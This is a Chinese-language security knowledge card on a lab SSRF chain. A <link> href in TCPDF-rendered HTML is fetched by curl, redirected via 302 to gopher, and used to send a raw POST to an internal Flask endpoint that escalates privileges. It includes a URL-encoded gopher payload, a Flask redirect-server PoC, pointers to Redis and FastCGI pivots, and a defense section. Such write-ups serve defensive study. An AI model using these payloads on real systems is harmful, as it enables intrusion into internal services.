---
id: web-generic-ssrf-tcpdf-link-href-filegetcontents-gopher
title: TCPDF writeHTML 的 link href 触发 fileGetContents SSRF：302 跳 gopher 向内网 Flask 发送原始 HTTP 报文
type: scenario
domain: web
path: web/generic/ssrf
technique: tcpdf-link-href-filegetcontents-gopher-ssrf
aliases:
- TCPDF SSRF
- TCPDF link href
- TCPDF fileGetContents
- writeHTML SSRF
- PDF 导出 SSRF
- gopher 打内网 Flask
tags:
- php
- tcpdf
- ssrf
- gopher
- curl
- followlocation
- redirect
- flask
- internal
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V413
  verified_at: '2026-11-09T15:18:27+08:00'
  notes: 已对照原文与图片核对：api.php 将 title 拼入 TCPDF writeHTML、getHtmlDomArray 正则匹配 link[type=text/css] 并取 href、TCPDF_STATIC::file_exists 放行 http(s)/gopher、url_exists 用 curl 且 open_basedir 为空/无 safe_mode 时 FOLLOWLOCATION、gopher://localhost:8082/_POST /users 翻转 priv、随后 admin 取 flag 均与原文一致；原文明确 gopher 放行为靶场对组件的改动。修正：卡片示例 {"user":"attacker"} 为 19 字节，原写 Content-Length 18 已改为 19 并注明需按实际 body 调整。未验证点：PoC 未在本机复跑。
---

## 一句话结论

当应用把用户可控 HTML 交给 TCPDF 的 `writeHTML()` 生成 PDF 时，`<link type="text/css" href="...">` 里的 href 会被 `getHtmlDomArray()` 提取并交给 `TCPDF_STATIC::fileGetContents()`；该函数对 http/https（以及被改造后允许的 gopher）调用 `url_exists()`，在 `open_basedir` 为空且未启用 `safe_mode` 时用 curl 并开启 `CURLOPT_FOLLOWLOCATION`——攻击者用外部 URL 返回 302 到 `gopher://localhost:PORT/_<原始报文>`，即可向内网/回环服务发送任意 TCP 请求（本例向 Flask `/users` 发 POST 将自己提为 admin）。

## 原理

- **用户内容进入 PDF 渲染**：应用把文章标题直接拼进 TCPDF 的 HTML（`$pdf->writeHTML($html, ...)`）。`writeHTML()` 调用 `getHtmlDomArray()`，后者用正则匹配所有 `<link ...>`，要求存在 `type="text/css"` 且 `media` 为 `all`/`print`（或未设置），再提取 `href` 并调用 `TCPDF_STATIC::fileGetContents($href)`。
- **fileGetContents 的协议判断**：`file_exists($filename)` 中，只有 `^https?://` 或 `^gopher://` 会走 `url_exists()`；其他带 `://` 的协议直接返回 false，否则退回本地 `file_exists`。原版 TCPDF 只放行 http/https，本例组件被加入 gopher 放行（这是靶场改动）。
- **url_exists 的 curl 行为**：它设置 `CURLOPT_NOBODY`、`CURLOPT_FAILONERROR`，并在 `ini_get('open_basedir') == '' && !ini_get('safe_mode')` 时设置 `CURLOPT_FOLLOWLOCATION = true`。PHP 默认配置通常满足这两个条件，于是 curl 会跟随服务器返回的 3xx。
- **跨协议跳转**：校验只发生在入口 URL 的 scheme 上；curl 跟随 `Location` 时默认不会把协议限制回 http/https（未显式设置 `CURLOPT_REDIR_PROTOCOLS`），因此 `https://attacker/redirect` → `302 Location: gopher://localhost:8082/_...` 可以成立。gopher 把 `_` 后的内容原样写入 TCP 连接，等于任意报文发送器。
- **打内网 Flask**：内网有一个仅监听 `127.0.0.1:8082` 的 Flask 服务，`/users` 路由对 POST 的 JSON `{"user":"..."}` 直接执行 `UPDATE users SET priv=not(priv) WHERE user=?`，无任何鉴权。经 gopher 伪造一个 HTTP POST 请求即可把目标用户 `priv` 翻成 1，随后主站 `admin` 动作返回 flag。若组件已直接允许 gopher（本例改动），可以省掉外部 302 跳板。
- **成立链条**：可控 HTML → PDF 导出 → TCPDF 外部资源请求 → 跨协议跳转到 gopher → 内网无鉴权接口。任何一环收紧（禁用外部资源、限制协议、禁止跟随重定向、内网接口鉴权）都会断开。

## 触发条件

- 应用把用户可控内容作为 HTML 传给 TCPDF `writeHTML()`，且用户能触发 PDF 导出。
- TCPDF 版本/配置中 `fileGetContents` 会发起网络请求，`open_basedir` 为空、`safe_mode` 关闭（PHP 默认），curl 跟随重定向。
- 目标内网/回环存在可被原始 TCP 报文触发的服务（HTTP、Redis、FastCGI 等），且攻击者知道端口与协议格式。
- 原版 TCPDF 场景需要攻击者提供一个可访问的 http/https 服务返回 302；若组件被改为直接允许 gopher，则可直接写 gopher URL。
- PDF 导出过程允许 `<link>` 标签（TCPDF 会解析 CSS 外链）。

## 利用步骤

1. 确认应用会把文章/标题内容渲染进 PDF，并尝试在标题放 `<link type="text/css" href="http://attacker/">`，观察是否收到服务端请求（DNS/HTTP 回连）。
2. 确认内网目标：本例为 `127.0.0.1:8082` 的 Flask，`/users` 接受 `{"user":"..."}` 并翻转 `priv`。
3. 准备 gopher 报文：按 HTTP 协议拼 `POST /users HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: N\r\n\r\n{"user":"<user>"}\r\n`，整体 URL 编码后放在 `gopher://localhost:8082/_` 之后。
4. 原版 TCPDF：在自己控制的 http/https 服务返回 `302 Location: gopher://...`，把标题 href 指向该服务，触发 PDF 导出让 curl 跟随。
5. 改造版 TCPDF：直接在 href 写 `gopher://localhost:8082/_<编码报文>`，触发导出。
6. 用同一账号请求 `admin` 动作（或重新登录）确认 `priv` 已变为 1，读取 flag。

## PoC

```text
# 标题中的 HTML（直连 gopher 的改造版；\r\n 需 URL 编码）
<link type="text/css" href="gopher://localhost:8082/_POST%20/users%20HTTP/1.1%0D%0AHost%3A%20localhost%0D%0AContent-Length%3A%2019%0D%0AContent-type%3A%20application/json%0D%0A%0D%0A%7B%22user%22%3A%22attacker%22%7D%0D%0A">
```

```python
# 原版 TCPDF：攻击者服务器返回 302 跳到 gopher
from flask import Flask, redirect

app = Flask(__name__)
GOPHER = ("gopher://localhost:8082/_POST%20/users%20HTTP/1.1%0D%0A"
          "Host%3A%20localhost%0D%0AContent-Length%3A%2019%0D%0A"
          "Content-type%3A%20application/json%0D%0A%0D%0A"
          "%7B%22user%22%3A%22attacker%22%7D%0D%0A")

@app.route("/redirect")
def r():
    return redirect(GOPHER, code=302)
```

说明：报文结构按原文流程整理；Host/端口/用户名按目标替换，Content-Length 须按实际 JSON body 字节数同步修改（示例 `{"user":"attacker"}` 为 19 字节）。未在本机复跑。

## 变体与关联

- **直接 gopher**：组件放行 gopher 时无需外部跳板；若只允许 http/https，则用 302/307 跨协议跳转，见 [[web-generic-ssrf-https-prefix-check-302-gopher-fastcgi]] 与 [[web-generic-ssrf-redirect-gopher-localhost-portscan-omi]]。
- **其他内网目标**：gopher 可打 Redis（写 crontab/authorized_keys）、FastCGI（伪造 PHP_VALUE）、MySQL 等；本例是 Flask 无鉴权接口。
- **其他 TCPDF 外部资源**：除 `<link>` 的 CSS 外，图片等外部资源也可能走 `fileGetContents`/curl，具体以版本源码为准。
- **边界**：`open_basedir` 非空、`safe_mode` 开启、`CURLOPT_REDIR_PROTOCOLS` 限制、禁用网络或内网接口鉴权时，本链不成立。

## 检测与防御

- **代码**：不要把用户内容直接作为 HTML 交给 PDF 引擎；对允许的标签/属性做白名单，禁止 `<link>`、外部图片等资源；生成 PDF 时关闭外部资源抓取。
- **配置**：设置 `open_basedir`，禁用 `CURLOPT_FOLLOWLOCATION` 或把 `CURLOPT_REDIR_PROTOCOLS` 限制为 http/https；对 TCPDF 的 `file_exists/url_exists` 做协议白名单（只允许业务需要的域名）。
- **网络**：Web 主机到内网的出站最小化；内网管理接口增加鉴权与来源校验，不依赖“只监听 127.0.0.1”。
- **检测**：PDF 导出进程发起外部 HTTP 请求、跟随 3xx 到非 http(s) 协议、访问 127.0.0.1/内网端口；TCPDF/curl 相关日志中出现 gopher scheme；内网接口收到无鉴权的异常 POST。
